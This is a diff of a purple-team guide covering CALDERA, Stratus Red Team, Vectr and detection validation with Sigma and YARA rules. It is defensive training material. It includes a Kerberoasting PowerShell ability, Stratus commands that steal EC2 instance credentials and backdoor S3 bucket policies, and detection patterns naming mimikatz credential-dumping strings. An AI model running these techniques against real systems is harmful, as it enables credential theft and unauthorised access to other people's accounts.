-# ── List adversaries ──────────────────────────────────────────────────────────
-adversaries = requests.get(
-    f"{BASE}/api/v2/adversaries", headers=HEADERS
-).json()
-for adv in adversaries:
-    print(adv["adversary_id"], adv["name"])
-
-# ── List abilities (techniques) ───────────────────────────────────────────────
-abilities = requests.get(f"{BASE}/api/v2/abilities", headers=HEADERS).json()
-print(f"Total abilities: {len(abilities)}")
-
-# ── List agents (connected endpoints) ────────────────────────────────────────
-agents = requests.get(f"{BASE}/api/v2/agents", headers=HEADERS).json()
-for a in agents:
-    print(a["paw"], a["host"], a["platform"])
-
-# ── Create an operation ───────────────────────────────────────────────────────
-op_payload = {
-    "name": "Purple Team Q1",
-    "adversary": {"adversary_id": "APT29_ID"},
-    "planner": {"id": "atomic"},
-    "group": "red",
-    "auto_close": True,
-    "state": "running"
-}
-op = requests.post(
-    f"{BASE}/api/v2/operations",
-    headers={**HEADERS, "Content-Type": "application/json"},
-    json=op_payload
-).json()
-print(f"Operation ID: {op['id']}")
-
-# ── Get operation results ─────────────────────────────────────────────────────
-results = requests.get(
-    f"{BASE}/api/v2/operations/{op['id']}/links",
-    headers=HEADERS
-).json()
-for link in results:
-    print(link["ability"]["technique_id"], link["status"], link["output"])
-```
-
-### Building a Custom Adversary Profile
-
+**Custom ability YAML:**
 ```yaml
-# caldera/data/adversaries/custom_apt.yml
-id: custom-apt-001
-name: Custom APT Emulation
-description: Simulates a financially motivated threat actor
-objective: ed32b9c3-9593-4c33-b0db-e2007315096b
-tags: []
-atomic_ordering:
-  - 9a30740d-3aa8-4c23-8efa-d51215e8a5b5   # PowerShell download cradle
-  - 3b2e6d4a-5f1c-4a8b-9d0e-7c6f2a1e8b3c   # Credential dump (LSASS)
-  - 4c3d2e1f-6a5b-4c8d-9e0f-1a2b3c4d5e6f   # Lateral movement via SMB
-  - 5e4d3c2b-7b6a-4d9e-0f1g-2b3c4d5e6f7g   # Data staging
-  - 6f5e4d3c-8c7b-4e0f-1g2h-3c4d5e6f7g8h   # Exfiltration via HTTPS
+- id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+  name: Kerberoast service accounts
+  description: Request TGS tickets for SPN-registered accounts
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Import-Module ActiveDirectory;
+          Get-ADUser -Filter {ServicePrincipalName -ne "$null"} |
+          % { Add-Type -AssemblyName System.IdentityModel;
+              New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.UserPrincipalName }
+        cleanup: |
+          Write-Host "No cleanup required"
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+        - source: host.user.is_privileged
 ```
 
-### CALDERA Operation Results → ATT&CK Navigator Layer
+### 4.2 Stratus Red Team
 
-```python
-import requests, json
+Stratus Red Team (https://github.com/DataDog/stratus-red-team) is an open-source tool focused on cloud adversary emulation, developed by Datadog.
 
-BASE = "http://localhost:8888"
-HEADERS = {"KEY": "ADMIN123"}
+**Cloud platform coverage:** AWS, Azure, GCP, Kubernetes
 
-# Fetch operation results
-op_id = "your-operation-id"
-links = requests.get(f"{BASE}/api/v2/operations/{op_id}/links", headers=HEADERS).json()
-
-# Build Navigator layer
-techniques = {}
-for link in links:
-    tid = link["ability"]["technique_id"]
-    status = link["status"]
-    if tid not in techniques:
-        techniques[tid] = {"detected": False, "ran": False}
-    if status == 0:    # success
-        techniques[tid]["ran"] = True
-
-# Compare with SIEM detections (from your SIEM API)
-# ... (query your SIEM here) ...
-
-layer_techniques = []
-for tid, data in techniques.items():
-    score = 100 if data.get("detected") else (50 if data["ran"] else 0)
-    layer_techniques.append({"techniqueID": tid, "score": score})
-
-layer = {
-    "name": f"CALDERA Operation {op_id}",
-    "versions": {"attack": "14"},
-    "domain": "enterprise-attack",
-    "techniques": layer_techniques
-}
-print(json.dumps(layer, indent=2))
-```
-
----
-
-## 5. Detection Validation Framework
-
-### Detection Validation Pipeline
-
-A systematic, repeatable process to close the gap between attacker capability and
-defensive detection:
-
-```
-Step 1: ENUMERATE
-  └─ Which ATT&CK techniques apply to your threat model?
-  └─ Prioritized by threat intel (see Section 2)
-
-Step 2: EMULATE
-  └─ Run Atomic Red Team test or CALDERA operation
-  └─ Record: timestamp, technique, tool used, exact command
-
-Step 3: CHECK SIEM
-  └─ Did an alert fire? Did a log even appear?
-  └─ Check within 5–10 minutes of execution
-
-Step 4: CLASSIFY
-  └─ Prevent   — blocked before execution
-  └─ Alert     — SIEM alert fired with correct severity
-  └─ Detect    — logs present, searchable, but no automated alert
-  └─ Blind     — no telemetry at all
-
-Step 5: REMEDIATE
-  └─ Missing log source → enable logging (Sysmon, PowerShell block logging, etc.)
-  └─ Missing rule → write Sigma rule → deploy to SIEM
-  └─ Wrong severity → tune rule
-  └─ Too noisy → add exception
-
-Step 6: RE-TEST
-  └─ Re-run the same atomic test
-  └─ Confirm detection fires
-
-Step 7: TRACK
-  └─ Update ATT&CK Navigator layer
-  └─ Maintain detection coverage scorecard
-```
-
-### Coverage Classification Definitions
-
-| Classification | Definition | Action |
-|----------------|------------|--------|
-| **Prevent** | Security control (EDR, NGFW, app control) blocks the technique before it completes | Validate prevention is consistent across all endpoints |
-| **Alert** | SIEM alert fires with severity ≥ Medium within acceptable TTD window | Tune severity, verify response playbook exists |
-| **Detect** | Log events exist in SIEM and are searchable but no automated alert rule fires | Write alert rule from existing log evidence |
-| **Blind spot** | No telemetry, no alert, no way to investigate after the fact | Enable log source first, then write detection |
-
-### Detection Coverage Scorecard Template
-
-| Tactic | Technique | Description | Atomic Test | Prevent | Alert | Detect | Blind | Notes |
-|--------|-----------|-------------|-------------|---------|-------|--------|-------|-------|
-| Initial Access | T1566.001 | Spear-phishing attachment | Macro payload | N | Y | Y | N | Alert only fires on macro execution, not delivery |
-| Execution | T1059.001 | PowerShell | Encoded command | N | Y | Y | N | Block logging enabled |
-| Execution | T1059.003 | cmd.exe | LOLBin abuse | N | N | Y | N | Need alert rule for suspicious cmd args |
-| Persistence | T1053.005 | Scheduled task creation | schtasks.exe | N | Y | Y | N | EventID 4698 alert active |
-| Persistence | T1547.001 | Run Key | reg.exe add | N | N | Y | N | Sysmon logs exist, no alert |
-| Privilege Escalation | T1548.002 | UAC Bypass | fodhelper | N | N | N | Y | No Sysmon rule for fodhelper |
-| Credential Access | T1003.001 | LSASS dump | mimikatz | N | Y | Y | N | LSASS PPL not enabled |
-| Credential Access | T1558.003 | Kerberoasting | Rubeus | N | N | Y | N | 4769 events present, no alert |
-| Lateral Movement | T1021.002 | SMB/PsExec | psexec.py | N | N | Y | N | Need lateral movement alert |
-| Lateral Movement | T1550.002 | Pass-the-Hash | mimikatz pth | N | N | N | Y | NTLMv2 events not centralized |
-| Collection | T1005 | Local data staging | robocopy | N | N | N | Y | No file access telemetry |
-| Exfiltration | T1041 | C2 channel exfil | Cobalt Strike | N | N | Y | N | DNS tunnel blind spot |
-
-### Coverage Metrics Dashboard
-
-Track these metrics over time to demonstrate improvement:
-
-| Metric | Formula | Target |
-|--------|---------|--------|
-| **ATT&CK Coverage %** | (Techniques with ≥1 rule / Total techniques tested) × 100 | >70% |
-| **Alert Coverage %** | (Techniques that trigger alert / Total techniques tested) × 100 | >50% |
-| **Blind Spot Rate** | (Blind techniques / Total techniques tested) × 100 | <15% |
-| **Mean TTD** | Median(time of alert − time of execution) | <5 min |
-| **Alert Fidelity** | True positives / (True positives + False positives) | >80% |
-| **Rule Backlog** | Count of techniques lacking a detection rule | Track trend |
-
-### Log Source Checklist (Windows)
-
-```powershell
-# Enable PowerShell Script Block Logging
-Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
-    -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
-
-# Enable PowerShell Module Logging
-Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
-    -Name "EnableModuleLogging" -Value 1 -Type DWord
-
-# Enable Process Command Line Auditing
-Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" `
-    -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1
-
-# Confirm Sysmon is running
-Get-Service Sysmon64 | Select-Object Name, Status, StartType
-
-# Check Windows Advanced Audit Policy
-auditpol /get /category:*
-```
-
----
-
-## 6. Sigma Rules for Detection Validation
-
-### Sigma Overview
-
-Sigma is a **generic SIEM detection rule format** that can be converted to any SIEM
-query language. Writing rules in Sigma means one rule works across Splunk, Elastic,
-Microsoft Sentinel, QRadar, and others.
-
-- **Repository:** https://github.com/SigmaHQ/sigma
-- **Rule library:** https://github.com/SigmaHQ/sigma/tree/master/rules
-- **pySigma:** https://github.com/SigmaHQ/pySigma
-
-### Sigma Rule Structure
-
-```yaml
-title: Mimikatz Command Line Arguments
-id: a8e65c88-e60d-4e1f-b15d-1e48ecf40a71
-status: test
-description: Detects Mimikatz command line arguments commonly used for credential dumping
-references:
-    - https://blog.gentilkiwi.com/mimikatz
-    - https://github.com/gentilkiwi/mimikatz
-author: Florian Roth
-date: 2021/06/15
-modified: 2023/09/01
-tags:
-    - attack.credential_access
-    - attack.t1003.001
-    - detection.threat_hunting
-logsource:
-    category: process_creation
-    product: windows
-detection:
-    selection:
-        CommandLine|contains:
-            - 'sekurlsa::'
-            - 'kerberos::'
-            - 'lsadump::'
-            - 'privilege::debug'
-            - 'crypto::'
-            - 'dpapi::'
-    condition: selection
-falsepositives:
-    - Penetration testing activity
-    - Security tool testing
-level: high
-```
-
-### Sigma Rule Field Reference
-
-| Field | Purpose | Required |
-|-------|---------|----------|
-| `title` | Human-readable rule name | Yes |
-| `id` | UUID for tracking | Yes |
-| `status` | stable / test / experimental | Yes |
-| `description` | What the rule detects | Yes |
-| `author` | Rule author | Recommended |
-| `date` | Creation date | Recommended |
-| `modified` | Last modification | Recommended |
-| `tags` | ATT&CK tags (attack.t####.###) | Recommended |
-| `logsource` | category + product | Yes |
-| `detection` | selection + condition | Yes |
-| `falsepositives` | Known false positive scenarios | Recommended |
-| `level` | critical / high / medium / low / informational | Yes |
-
-### Sigma Detection Modifiers
-
-```yaml
-detection:
-    selection_exact:
-        FieldName: "exact value"
-    selection_contains:
-        FieldName|contains: "substring"
-    selection_startswith:
-        FieldName|startswith: "prefix"
-    selection_endswith:
-        FieldName|endswith: ".ps1"
-    selection_re:
-        FieldName|re: '^cmd\.exe\s+/c\s+'
-    selection_cidr:
-        SourceIP|cidr: "10.0.0.0/8"
-    selection_all:
-        FieldName|contains|all:
-            - "value1"
-            - "value2"
-    selection_any:
-        FieldName|contains:
-            - "value1"
-            - "value2"
-    condition: selection_contains and not selection_exact
-```
-
-### Sigma to SIEM Conversion
-
+**CLI usage:**
 ```bash
-# Install sigma-cli and backends
-pip install sigma-cli pySigma-backend-splunk pySigma-backend-elastic \
-    pySigma-backend-microsoft365defender pySigma-pipeline-windows
+# List all available attack techniques
+stratus-red-team list
 
-# Convert to Splunk SPL
-sigma convert -t splunk -p splunk_windows \
-    sigma/rules/windows/process_creation/proc_creation_win_mimikatz_commandline.yml
+# List techniques for a specific platform
+stratus-red-team list --platform aws
 
-# Convert entire directory to Splunk
-sigma convert -t splunk -p splunk_windows sigma/rules/windows/ \
-    -o splunk_rules.conf
+# Warm up (create prerequisites without detonating)
+stratus-red-team warmup aws.credential-access.ec2-steal-instance-credentials
 
-# Convert to Elasticsearch EQL
-sigma convert -t elasticsearch -p ecs_windows -f eql \
-    sigma/rules/windows/process_creation/
+# Detonate (execute the attack technique)
+stratus-red-team detonate aws.credential-access.ec2-steal-instance-credentials
 
-# Convert to Microsoft Sentinel KQL
-sigma convert -t sentinel -p windows-audit \
-    sigma/rules/windows/
+# Cleanup (destroy prerequisites and any artifacts)
+stratus-red-team cleanup aws.credential-access.ec2-steal-instance-credentials
 
-# Convert to Elastic SIEM (NDJSON)
-sigma convert -t elasticsearch -p ecs_windows -f kibana_ndjson \
-    sigma/rules/windows/ -o rules.ndjson
-
-# List available backends
-sigma list backends
-
-# List available pipelines
-sigma list pipelines
+# Warm up, detonate, and cleanup in one command
+stratus-red-team detonate aws.exfiltration.s3-backdoor-bucket-policy --auto-cleanup
 ```
 
-### Writing a Sigma Rule from Atomic Test Output
+**Key AWS techniques in Stratus:**
+| Technique ID | ATT&CK Mapping | Description |
+|---|---|---|
+| aws.credential-access.ec2-steal-instance-credentials | T1552.005 | Steal EC2 instance metadata credentials |
+| aws.exfiltration.s3-backdoor-bucket-policy | T1537 | Backdoor S3 bucket policy for exfiltration |
+| aws.persistence.iam-backdoor-user | T1136.003 | Create backdoor IAM user |
+| aws.discovery.ec2-enumerate-from-instance | T1580 | Enumerate EC2 resources from instance |
+| aws.lateral-movement.ec2-instance-connect | T1021.004 | Lateral movement via EC2 Instance Connect |
 
-```python
-# Workflow:
-# 1. Run atomic test -- observe what log fields are generated
-# 2. Write Sigma rule targeting those specific fields
-# 3. Convert to SIEM query and test
-
-# Step 1: Run atomic (from PowerShell):
-# Invoke-AtomicTest T1053.005 -TestNumbers 1
-#
-# Observe in Windows Event Log:
-#   EventID: 4698 (A scheduled task was created)
-#   SubjectUserName: CORP\jsmith
-#   TaskName: \Microsoft\Windows\Update\Backdoor
-#   TaskContent: <Actions><Exec><Command>powershell.exe</Command>...
-
-# Step 2: Sigma rule targeting those fields
-SIGMA_RULE = (
-    "title: Suspicious Scheduled Task Creation via Schtasks\n"
-    "status: test\n"
-    "description: Detects schtasks.exe with suspicious command-line arguments\n"
-    "tags:\n"
-    "    - attack.persistence\n"
-    "    - attack.t1053.005\n"
-    "logsource:\n"
-    "    category: process_creation\n"
-    "    product: windows\n"
-    "detection:\n"
-    "    selection:\n"
-    "        Image|endswith: '\\\\schtasks.exe'\n"
-    "        CommandLine|contains: '/create'\n"
-    "    condition: selection\n"
-    "level: high\n"
-)
-print(SIGMA_RULE)
-```
-
-### YARA Rules for File-Based Detection Validation
-
-```yara
-rule Mimikatz_Strings {
-    meta:
-        description = "Detects Mimikatz binary based on characteristic strings"
-        author = "Purple Team"
-        date = "2024-01-15"
-        reference = "https://github.com/gentilkiwi/mimikatz"
-        mitre_attack = "T1003.001"
-    strings:
-        $s1 = "sekurlsa::logonpasswords" ascii wide
-        $s2 = "privilege::debug" ascii wide
-        $s3 = "mimikatz" ascii wide nocase
-        $s4 = "gentilkiwi" ascii wide
-        $s5 = { 6D 69 6D 69 6B 61 74 7A }   // "mimikatz" hex
-    condition:
-        3 of them
-}
-
-rule CobaltStrike_Beacon {
-    meta:
-        description = "Detects Cobalt Strike beacon by EICAR-like patterns"
-        author = "Purple Team"
-        mitre_attack = "T1071.001"
-    strings:
-        $cs1 = "%s as %s\\%s" ascii
-        $cs2 = "beacon.x64.dll" ascii wide
-        $sleep = { 68 58 13 00 00 }           // sleep(5000)
-    condition:
-        any of them
-}
-```
-
----
-
-## 7. Breach and Attack Simulation (BAS) Tools
-
-### Overview
-
-BAS platforms automate adversary emulation continuously, without requiring human
-red team operators. They complement purple team exercises by providing:
-
-- Daily/weekly automated detection validation
-- Continuous regression testing after SIEM rule changes
-- Benchmark scoring over time
-- Evidence for compliance and security program reporting
-
-### Commercial BAS Platforms
-
-| Platform | Focus | Notable Feature |
-|----------|-------|----------------|
-| **Cymulate** | SaaS BAS, full ATT&CK coverage | APT simulation + phishing + lateral movement + exfiltration vectors; MITER ATT&CK score |
-| **AttackIQ** | ATT&CK-aligned, enterprise | Scenario library, deep SIEM/EDR integrations, prevention/detection scoring |
-| **SafeBreach** | Playbook-based | 10,000+ attack playbooks, MITRE ATT&CK coverage heatmap |
-| **Picus Security** | Threat-centric | Prevention score + detection score, vendor-specific content |
-| **SCYTHE** | Threat emulation | Community threat library, custom emulation plans, C2 channels |
-| **NodeZero** (Horizon3.ai) | Autonomous pentesting + BAS | Finds and chains real vulnerabilities, not just simulations |
-| **Pentera** | Automated pentesting | Network-wide automated red team with impact scoring |
-
-### Open Source BAS Alternatives
-
-- **CALDERA** (MITRE) — see Section 4
-- **Atomic Red Team** (Red Canary) — see Section 3
-- **VECTR** (SRA) — purple team tracking, see Section 10
-- **PurpleSharp** — C2-based ATT&CK test tool for Active Directory environments
-- **Stratus Red Team** (Datadog) — cloud-focused ATT&CK emulation (AWS, GCP, Azure, Kubernetes)
-
+**CloudTrail validation after detonation:**
 ```bash
-# PurpleSharp example
-.\PurpleSharp.exe /pb playbooks\lateral_movement.json /log sharplogs.json
-
-# Stratus Red Team (Cloud)
-stratus list                          # list available attack techniques
-stratus detonate aws.execution.ec2-user-data   # run a technique
-stratus cleanup aws.execution.ec2-user-data    # cleanup
+# Query CloudTrail for the technique's expected API calls
+aws cloudtrail lookup-events   --lookup-attributes AttributeKey=EventName,AttributeValue=GetCallerIdentity   --start-time $(date -u -d '10 minutes ago' +%Y-%m-%dT%H:%M:%SZ)   --query 'Events[].{Time:EventTime,Name:EventName,User:Username}'   --output table
 ```
 
-### BAS Use Cases
+### 4.3 Scythe (Commercial)
 
-| Use Case | Description |
-|----------|-------------|
-| **Continuous validation** | Run entire ATT&CK coverage suite daily; alert when detection score drops |
-| **Change validation** | Run before/after SIEM rule changes to verify improvement |
-| **New tool validation** | Validate EDR/SIEM before go-live using BAS evidence |
-| **Regression testing** | Ensure new SIEM rules don't break existing detections |
-| **Compliance evidence** | Automated evidence that controls are tested regularly |
-| **Benchmarking** | Track MITRE ATT&CK coverage score over time across quarters |
+Scythe (https://scythe.io) is a commercial adversary emulation platform used by enterprise purple teams.
+
+**Key capabilities:**
+- **Campaign creation** — GUI-based campaign builder with drag-and-drop TTP sequencing
+- **Implant deployment** — Multiple C2 protocols, staged implant delivery
+- **TTP library** — Pre-built modules mapped to ATT&CK, updated for current threats
+- **Reporting** — Executive and technical reports with ATT&CK heatmap export
+- **Community Threats** — Shared threat actor emulation plans from the community
+
+### 4.4 Vectr (Purple Team Tracking)
+
+Vectr (https://vectr.io) is a purple team management platform for tracking test cases, results, and coverage over time. Available as open-source (self-hosted) or commercial SaaS.
+
+**Hierarchy:** Organizations → Projects → Campaigns → Assessments → Test Cases
+
+**Test case workflow:**
+1. Create test case with ATT&CK technique mapping
+2. Document procedure (how the test was executed)
+3. Record result: Detected / Not Detected
+4. Capture evidence (screenshots, SIEM alerts, logs)
+5. Track remediation status
+
+**ATT&CK heatmap:** Vectr auto-generates ATT&CK Navigator layers from recorded test results.
+
+**REST API for programmatic test case management:**
+```bash
+# Create a new test case via API
+curl -X POST https://vectr.io/api/v1/testcases   -H "Authorization: Bearer $VECTR_TOKEN"   -H "Content-Type: application/json"   -d '{
+    "name": "T1558.003 Kerberoasting",
+    "attackTechnique": "T1558.003",
+    "outcome": "failed",
+    "notes": "No alert generated. Missing detection rule for RC4 TGS requests."
+  }'
+```
 
 ---
+## 5. Detection Validation Methodology
 
-## 8. Purple Team Exercise Planning
+### 5.1 Detection Validation Workflow
 
-### Pre-Exercise Preparation
-
-**1. Define objectives**
-- Which ATT&CK tactics/techniques are in scope?
-- Which threat actor are we emulating?
-- What is the hypothesis? ("We believe we cannot detect T1003.001")
-
-**2. Establish scope**
-- Target systems: staging vs. production?
-- Time window: when will tests run?
-- Safety constraints: no destructive tests (T1485, T1486) in production
-- Out-of-scope: critical systems, patient data, financial systems
-
-**3. Team composition**
-- 2–3 red operators (knows ATT&CK techniques, can execute Atomic tests)
-- 2–3 blue analysts (SIEM access, detection rule experience)
-- 1 facilitator (tracks gaps, time-keeps, records results)
-- Optional: threat intelligence analyst (brief on relevant TTPs)
-
-**4. Threat intelligence brief**
-- Share relevant threat actor TTPs with both teams before the exercise
-- "Today we are emulating APT29, known for T1566.001, T1059.001, T1003.001..."
-- Both sides work together — not a test of blue team; a test of defenses
-
-**5. White card system**
-- Red team announces what technique they are about to execute
-- Blue team arms detection query and watches for the event
-- If not detected within 60 seconds → gap confirmed → document immediately
-
-### During-Exercise Workflow
+The purple team detection validation cycle has 9 steps:
 
 ```
-For each technique:
-
-   Red: "About to run T1059.001 Test #1 — PowerShell encoded command"
-   Blue: "Ready — watching for EventID 4103 in Splunk"
-
-   Red: Execute atomic test
-   Timer: 60-second detection window
-
-   If detected:
-     Blue: "Got it — fired at [timestamp], severity High, rule: PSEncodedCommand"
-     Log: DETECTED ✓
-
-   If not detected:
-     Blue: "No alert — investigating..."
-
-     Check 1: Is the log even present?
-       → If NO log: missing log source (Sysmon? PowerShell logging?)
-       → If log present: missing rule or wrong field mapping
-
-     Log: BLIND or DETECT-ONLY
-
-   Create ticket: [Technique] [Status] [Root cause] [Owner] [Due date]
-   Move to next technique
+1. SELECT ATT&CK technique to test
+        │
+        ▼
+2. DOCUMENT detection hypothesis
+   (What alert/log should fire, in which tool, within what SLA?)
+        │
+        ▼
+3. EXECUTE atomic test or emulation scenario
+        │
+        ▼
+4. CHECK SIEM/EDR within defined SLA (e.g., 5 min)
+        │
+        ▼
+5. DOCUMENT RESULT:
+   ┌─────────────────────────────────────────┐
+   │ Detected        │ Not Detected          │
+   │ (go to step 6a) │ (go to step 6b)       │
+   └─────────────────────────────────────────┘
+        │
+        ▼
+6a. ASSESS alert quality (go to step 9)
+6b. IDENTIFY gap (missing source/rule/tuning)
+        │
+        ▼
+7. REMEDIATE (create rule / fix log source / tune)
+        │
+        ▼
+8. RETEST (loop to step 3)
+        │
+        ▼
+9. UPDATE Navigator coverage layer + tracking platform
 ```
 
-### Post-Exercise Deliverables
+### 5.2 Detection Hypothesis Documentation
 
-**Detection gap report template:**
+Before executing any test, document:
 
 ```markdown
-## Purple Team Exercise — Gap Report
-**Date:** 2024-01-15
-**Facilitator:** [Name]
-**Red Team:** [Names]
-**Blue Team:** [Names]
-**Techniques tested:** 22
-**Detected:** 14 (64%)
-**Logged only:** 5 (23%)
-**Blind spots:** 3 (14%)
+## Detection Hypothesis: T1558.003 Kerberoasting
 
-### Critical Gaps (Blind Spots)
+**Technique:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
+**Test:** Invoke-AtomicTest T1558.003 -TestNumbers 1
 
-| # | Technique | Description | Root Cause | Owner | Due Date |
-|---|-----------|-------------|------------|-------|----------|
-| 1 | T1550.002 | Pass-the-Hash | NTLMv2 events not forwarded to SIEM | SecOps | 2024-02-01 |
-| 2 | T1041 | C2 exfil via DNS tunnel | DNS query logging not enabled | NetOps | 2024-02-01 |
-| 3 | T1070.001 | Event log cleared | Sysmon not deployed on server OU | SecOps | 2024-02-15 |
+**Expected detection:**
+- Tool: Splunk (Security SIEM)
+- Alert name: "Possible Kerberoasting — RC4 TGS Request"
+- Detection logic: Event ID 4769 with TicketEncryptionType = 0x17 (RC4) and
+  TicketOptions = 0x40810000 from a non-service account
+- SLA: Alert within 10 minutes of execution
+- Severity: High
 
-### Detection-Only Gaps (Need Alert Rules)
+**Expected telemetry (minimum):**
+- Windows Security Event 4769 in Splunk index=windows
+- Source account, target service, encryption type visible in alert
 
-| # | Technique | Log Source Available | Proposed Rule | Owner |
-|---|-----------|---------------------|---------------|-------|
-| 1 | T1053.005 | Yes — EventID 4698 | Scheduled task with cmd/PS in content | ThreatDetect |
-| 2 | T1547.001 | Yes — Sysmon EventID 13 | Reg write to HKCU\...\Run | ThreatDetect |
-| 3 | T1021.006 | Yes — WinRM event log | WinRM lateral movement | ThreatDetect |
-
-### Re-Test Schedule
-All gaps to be remediated and re-tested by 2024-02-28.
+**ATT&CK Navigator score if detected:** 100
+**ATT&CK Navigator score if telemetry only:** 50
+**ATT&CK Navigator score if not detected:** 0
 ```
 
-### Sample One-Day Purple Team Agenda
+### 5.3 Alert Quality Assessment
+
+When an alert does fire, assess its quality across these dimensions:
+
+| Dimension | Questions |
+|---|---|
+| **True positive accuracy** | Does the alert correctly identify the malicious action? Any false positive risk? |
+| **Correct context** | Does the alert include: source host, user, target, timestamp, parent process? |
+| **ATT&CK tagging** | Is the technique ID (T1558.003) tagged in the alert metadata? |
+| **Severity** | Is the severity appropriate? (Kerberoasting = High, not Informational) |
+| **Analyst detail** | Can an analyst understand what happened and why it's suspicious from the alert alone? |
+| **Auto-enrichment** | Does the alert auto-enrich with: user risk score, asset criticality, threat intel hits? |
+| **Linked playbook** | Does the alert link to an IR playbook for this technique? |
+
+**Quality scoring:**
+- All dimensions met → Score 100, mark Green in Navigator
+- Most dimensions met, minor gaps → Score 75, mark Yellow
+- Alert fires but poor context/enrichment → Score 50, mark Yellow
+- Alert does not fire → Score 0–25, mark Red
+
+### 5.4 Detection Gap Categories
+
+When a technique is not detected, categorize the gap to drive the right remediation:
+
+| Gap Category | Description | Remediation |
+|---|---|---|
+| **Missing log source** | The relevant data is not collected at all (e.g., Sysmon not deployed, CloudTrail disabled) | Deploy log source; validate ingestion |
+| **Log present, no rule** | Data reaches SIEM but no detection rule exists | Write Sigma rule; convert to SIEM query |
+| **Rule misconfigured** | Rule exists but has syntax error, wrong index, or field name mismatch | Debug and fix rule; retest |
+| **EDR telemetry gap** | EDR does not generate telemetry for this technique (product limitation) | Write compensating SIEM rule from available logs |
+| **Cloud API not logged** | Cloud service API calls not enabled in audit logging | Enable CloudTrail data events / Entra diagnostic settings |
+| **Log volume filtered** | High-volume events being dropped by SIEM filters | Adjust filter; increase capacity or use sampling |
+
+### 5.5 Coverage Measurement
+
+**Technique coverage %:** (Number of techniques with detection score ≥ 75) / (Total techniques tested) × 100
+
+**Recommended coverage targets by tactic priority:**
+
+| Priority | Tactics | Target Coverage |
+|---|---|---|
+| Critical | Credential Access, Lateral Movement, Execution | ≥ 80% |
+| High | Persistence, Privilege Escalation, Defense Evasion | ≥ 70% |
+| Medium | Discovery, Collection, C2 | ≥ 60% |
+| Lower | Recon, Resource Dev, Exfiltration, Impact | ≥ 50% |
+
+### 5.6 Detection Engineering Feedback Loop
+
+Purple team findings should flow directly into the detection engineering backlog:
 
 ```
-09:00  Kickoff — rules of engagement, objectives, threat intel brief
-09:30  Initial Access
-         T1566.001  Spear-phishing attachment (macro)
-         T1190      Exploit public-facing application (web shell)
-10:30  Execution
-         T1059.001  PowerShell (encoded, download cradle)
-         T1059.003  cmd.exe (LOLBin abuse)
-         T1059.007  JavaScript via wscript.exe
-11:30  Persistence
-         T1053.005  Scheduled task creation
-         T1547.001  Run Key registry write
-         T1543.003  Windows service creation
-12:00  LUNCH — log review debrief, update gap tracker
-13:00  Privilege Escalation
-         T1548.002  UAC bypass (fodhelper)
-         T1134.001  Token impersonation (CreateProcessWithToken)
-14:00  Credential Access
-         T1003.001  LSASS memory dump (mimikatz)
-         T1558.003  Kerberoasting (Rubeus)
-         T1552.001  Credentials in files
-15:00  Lateral Movement
-         T1021.002  SMB / PsExec lateral
-         T1021.006  WinRM remote execution
-         T1550.002  Pass-the-Hash
-15:45  Exfiltration
-         T1041      Exfil over C2 (HTTP/S)
-         T1567.002  Upload to cloud service (OneDrive API)
-         T1048.003  Exfil via DNS tunnel
-16:30  Wrap-up
-         Review gap tracker, assign owners, set remediation deadlines
-         Next exercise date: 90 days
-```
-
----
-
-## 9. Detection Engineering Workflow
-
-### Detection-as-Code Principles
-
-- Version control all detection rules in Git (just like application code)
-- Every rule requires: ATT&CK tag, author, false positive documentation, severity
-- Rule changes require pull request review — peer review catches mistakes
-- Automated testing: every rule must have a test that it fires on known-bad data
-- CI/CD deploy: merged rules auto-deploy to SIEM
-
-### Rule Lifecycle
-
-```
-Draft → Review → Test → Deploy → Monitor → Retire
-
-Draft:
-  - Atomic test identifies gap
-  - Analyst writes Sigma rule targeting observed log fields
-  - Tests rule against atomic test log data (TP confirmed)
-  - Tests against known-good baseline (FP rate acceptable)
-
-Review:
-  - PR submitted to detection-rules repository
-  - Peer review: accuracy, ATT&CK tag, severity level, FP documentation
-  - Security architect review for high/critical rules
-
-Test:
-  - CI pipeline runs Sigma validator (schema check)
-  - CI runs pySigma conversion to target SIEM
-  - CI runs rule against labeled test data (TP and FP datasets)
-  - All tests must pass before merge
-
-Deploy:
-  - Merge to main triggers CI/CD deploy to SIEM (staging first, then production)
-  - Slack/Teams notification: "Rule T1053.005 deployed to Splunk"
-
-Monitor:
-  - False positive rate tracked per rule (alert/TP ratio)
-  - If FP rate > 20%, auto-create tuning ticket
-  - Monthly review of rule effectiveness
-
-Retire:
-  - Rule covers technique no longer in threat model → archive, not delete
-  - Rule replaced by better version → old rule tagged as deprecated
-```
-
-### Sigma Rule CI/CD Pipeline
-
-```yaml
-# .github/workflows/detection-rules.yml
-name: Detection Rule CI/CD
-
-on:
-  push:
-    branches: [main]
-    paths:
-      - 'rules/**/*.yml'
-  pull_request:
-    paths:
-      - 'rules/**/*.yml'
-
-jobs:
-  validate:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Install sigma-cli
-        run: pip install sigma-cli pySigma-backend-splunk pySigma-backend-elastic
-
-      - name: Validate Sigma rule syntax
-        run: sigma check rules/**/*.yml
-
-      - name: Convert to Splunk SPL
-        run: sigma convert -t splunk -p splunk_windows rules/ -o /tmp/splunk_rules.conf
-
-      - name: Convert to Elastic EQL
-        run: sigma convert -t elasticsearch -p ecs_windows -f eql rules/
-
-      - name: Run test suite
-        run: python tests/run_detection_tests.py
-
-  deploy-staging:
-    needs: validate
-    if: github.ref == 'refs/heads/main'
-    runs-on: ubuntu-latest
-    steps:
-      - name: Deploy to Splunk Staging
-        env:
-          SPLUNK_URL: ${{ secrets.SPLUNK_STAGING_URL }}
-          SPLUNK_TOKEN: ${{ secrets.SPLUNK_STAGING_TOKEN }}
-        run: python scripts/deploy_to_splunk.py --env staging
-
-  deploy-production:
-    needs: deploy-staging
-    if: github.ref == 'refs/heads/main'
